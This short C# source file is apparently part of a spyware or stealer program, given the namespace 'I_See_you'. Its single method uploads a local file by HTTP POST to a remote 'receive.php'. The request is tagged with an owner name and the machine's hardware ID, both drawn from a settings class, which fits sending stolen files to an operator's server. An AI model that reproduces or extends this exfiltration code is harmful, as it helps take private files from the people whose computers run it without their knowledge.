using System;
using System.Net;

namespace I_See_you
{
    class Network
    {
        public static void UploadFile(string path)
        {
            try
            {
                new WebClient().UploadFile(RawSettings.SiteUrl + string.Format("receive.php?user={0}&hwid={1}", RawSettings.Owner, RawSettings.HWID), "POST", path);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
    }
}
